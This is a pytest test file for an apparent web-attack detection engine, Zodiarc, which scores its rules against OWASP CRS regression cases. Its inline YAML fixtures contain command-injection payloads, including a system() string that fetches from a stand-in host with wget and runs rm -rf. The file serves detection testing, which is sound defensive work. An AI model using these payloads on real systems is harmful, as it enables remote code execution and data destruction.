"""Scoring this project's rules against a corpus somebody else wrote.

The corpus is OWASP CRS's own regression suite. That makes the direction matter
more than usual, and ADR-0008 is the reason: the `score-crs` it retired scored
*CRS's* rules with *CRS's* corpus, a project grading itself. This runs the other
way — Zodiarc's rules against a question paper Zodiarc had no hand in — which is
the only kind of score worth quoting.

The tests here use a corpus written inline rather than the vendored one. The
real thing is a git clone that a fresh checkout may not have, and a test that
skips when it is absent would be a test nobody notices has stopped running.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from zodiarc.detect.engine import RuleEngine
from zodiarc.detect.rulepacks import default_rules
from zodiarc.detect.rules import load_rules
from zodiarc.evaluation.crs_corpus import CorpusError, score_corpus

#: One case per shape, so each assertion below has exactly one thing to fail on.
CASES = """\
---
meta:
  author: "test"
rule_id: 933150
tests:
  - test_id: 1
    desc: payload in the query, and Zodiarc catches it
    stages:
      - input:
          uri: "/get?x=system('id')"
          method: GET
          headers:
            User-Agent: "OWASP CRS test agent"
        output:
          log:
            expect_ids: [933150]
  - test_id: 2
    desc: payload in the query, and Zodiarc does not catch it
    stages:
      - input:
          uri: "/get?x=perfectly-ordinary-value"
          method: GET
          headers:
            User-Agent: "OWASP CRS test agent"
        output:
          log:
            expect_ids: [933150]
  - test_id: 3
    desc: payload in the body, which no access log records
    stages:
      - input:
          uri: "/post"
          method: POST
          data: "var=system('id')"
          headers:
            User-Agent: "OWASP CRS test agent"
        output:
          log:
            expect_ids: [933150]
"""


@pytest.fixture
def corpus(tmp_path: Path) -> Path:
    root = tmp_path / "tests"
    folder = root / "REQUEST-933-APPLICATION-ATTACK-PHP"
    folder.mkdir(parents=True)
    (folder / "933150.yaml").write_text(CASES, encoding="utf-8")
    return root


@pytest.fixture(scope="module")
def engine() -> RuleEngine:
    return RuleEngine(default_rules())


def test_a_payload_in_the_query_is_within_reach(corpus: Path, engine: RuleEngine) -> None:
    (php,) = score_corpus(corpus, engine=engine, families=["933"])

    assert php.cases == 3
    assert php.in_reach == 2, "the two with a query string; the body case is not"


def test_a_payload_in_the_body_is_not_counted_as_a_miss(corpus: Path, engine: RuleEngine) -> None:
    """The line this whole measurement rests on.

    A combined access log records the request line, the Referer and the
    User-Agent. It does not record the body — not for Zodiarc, not for anything.
    Scoring those cases as failures would measure the log format and report it
    as a score for the rules.
    """
    (php,) = score_corpus(corpus, engine=engine, families=["933"])

    assert php.out_of_reach == 1
    assert php.cases == php.in_reach + php.negatives + php.out_of_reach + php.unscored


def test_recall_is_over_what_could_be_seen_not_over_everything(
    corpus: Path, engine: RuleEngine
) -> None:
    (php,) = score_corpus(corpus, engine=engine, families=["933"])

    assert php.caught == 1, "system('id') fires; the ordinary value does not"
    assert php.recall == pytest.approx(0.5), "1 of the 2 in reach, not 1 of 3"


def test_the_misses_are_reported_so_they_can_be_worked_on(corpus: Path, engine: RuleEngine) -> None:
    """A bare percentage says a rule pack is weak. The misses say how."""
    (php,) = score_corpus(corpus, engine=engine, families=["933"])

    assert php.missed
    assert "perfectly-ordinary-value" in php.missed[0]


def test_a_corpus_that_is_not_there_says_where_it_should_be(
    tmp_path: Path, engine: RuleEngine
) -> None:
    """It is a git clone, not part of the package, so a first-time reader will
    hit this — and a bare "not found" makes a missing checkout look broken."""
    with pytest.raises(CorpusError) as raised:
        score_corpus(tmp_path / "nowhere", engine=engine)

    message = str(raised.value)
    assert "coreruleset" in message
    assert "git clone" in message, "the message has to carry the way out"


def test_an_unknown_family_is_refused_rather_than_scored_as_empty(
    corpus: Path, engine: RuleEngine
) -> None:
    """Zero of zero is not a result, and a typo that scores 0% silently is
    worse than one that stops."""
    with pytest.raises(CorpusError, match="999"):
        score_corpus(corpus, engine=engine, families=["999"])


#: `expect_ids` means a rule should fire; a `no_expect_ids` case described as a
#: false positive is traffic CRS has certified as harmless. Both are scored, in
#: opposite directions. (The third kind is below, and is scored in neither.)
MIXED = """\
---
meta:
  author: "test"
rule_id: 933150
tests:
  - test_id: 1
    desc: a real attack — something should fire
    stages:
      - input:
          uri: "/get?x=system('id')"
          method: GET
        output:
          log:
            expect_ids: [933150]
  - test_id: 2
    desc: "False Positive: ordinary prose that merely mentions a function"
    stages:
      - input:
          uri: "/get?test=PaintValdosta"
          method: GET
        output:
          log:
            no_expect_ids: [933150]
"""


@pytest.fixture
def mixed(tmp_path: Path) -> Path:
    root = tmp_path / "tests"
    folder = root / "REQUEST-933-APPLICATION-ATTACK-PHP"
    folder.mkdir(parents=True)
    (folder / "933150.yaml").write_text(MIXED, encoding="utf-8")
    return root


def test_a_false_positive_case_is_not_counted_as_a_miss(mixed: Path, engine: RuleEngine) -> None:
    """The corpus is not a list of attacks. A third of the PHP cases are
    requests that must *not* match, and counting those in the denominator
    reports the rules as worse than they are — which is the same dishonesty as
    reporting them better, pointing the other way.
    """
    (php,) = score_corpus(mixed, engine=engine, families=["933"])

    assert php.in_reach == 1, "only the attack counts towards recall"
    assert php.caught == 1
    assert php.recall == pytest.approx(1.0)


def test_a_false_positive_case_is_measured_in_its_own_right(
    mixed: Path, engine: RuleEngine
) -> None:
    """And it is the more valuable half. A rule pack can reach any recall by
    matching everything; what stops it is being counted when it fires on
    traffic somebody else has certified as harmless."""
    (php,) = score_corpus(mixed, engine=engine, families=["933"])

    assert php.negatives == 1
    assert php.false_alarms == 0, "PaintValdosta is prose, and nothing should fire on it"


#: The trap. `no_expect_ids` names CRS rule IDs, and the traffic under it is
#: whatever it happens to be — here, a live RCE that a neighbouring CRS rule is
#: expected to catch instead. Taken from 932230.yaml, shortened.
RULE_SPECIFIC = """\
---
meta:
  author: "test"
rule_id: 932230
tests:
  - test_id: 1
    desc: System Command Injection (932230) from old modsec regressions
    stages:
      - input:
          uri: "/get?foo=system('echo%20cd%20/tmp;wget%20http://evil.test/x.png;rm%20-rf')"
          method: GET
        output:
          log:
            no_expect_ids: [932230]
"""


@pytest.fixture
def rule_specific(tmp_path: Path) -> Path:
    root = tmp_path / "tests"
    folder = root / "REQUEST-932-APPLICATION-ATTACK-RCE"
    folder.mkdir(parents=True)
    (folder / "932230.yaml").write_text(RULE_SPECIFIC, encoding="utf-8")
    return root


def test_a_rule_specific_negative_is_not_treated_as_harmless_traffic(
    rule_specific: Path, engine: RuleEngine
) -> None:
    """`no_expect_ids` constrains one CRS rule by number; it does not certify
    the request. This one is `system('echo cd /tmp;wget …;rm -rf')` — an
    attack, marked so that *this* CRS rule stays out of the way of another one.

    Zodiarc has no mapping onto CRS rule IDs, so it can be neither right nor
    wrong here. Counting the match as a false alarm would be the same error as
    counting it as a miss, pointed the other way — and this time it would
    understate the rules rather than overstate them.
    """
    (rce,) = score_corpus(rule_specific, engine=engine, families=["932"])

    assert rce.unscored == 1
    assert rce.negatives == 0, "nothing certified this request as harmless"
    assert rce.false_alarms == 0
    assert rce.in_reach == 0, "and the corpus never asked for a match either"


def test_a_benign_label_is_not_a_detection(mixed: Path) -> None:
    """The rule packs describe ordinary use as well as attacks, and a corpus
    request lands on `/get` or `/post` — which an action rule recognises.

    Counting any match at all was right while every rule was about an attack.
    It stopped being right the moment `action/` existed: adding those rules
    moved RCE from 9% to 20% and session from 5% to 65% without a single new
    attack being detected, and produced eleven "false alarms" in PHP that were
    a `Form Submission` label on a POST. Both directions of the score were
    wrong, and both looked like results.
    """
    pack = """
version: 1
rules:
  - id: action_form_submission
    name: Form Submission
    category: api_call
    severity: info
    confidence: 0.55
    match:
      any:
        - field: path
          contains: /get
"""
    path = mixed.parent / "action.yaml"
    path.write_text(pack, encoding="utf-8")
    engine = RuleEngine(load_rules([path]))

    (php,) = score_corpus(mixed, engine=engine, families=["933"])

    assert php.caught == 0, "recognising the request is not detecting the attack"
    assert php.false_alarms == 0, "and it is not a false alarm either"
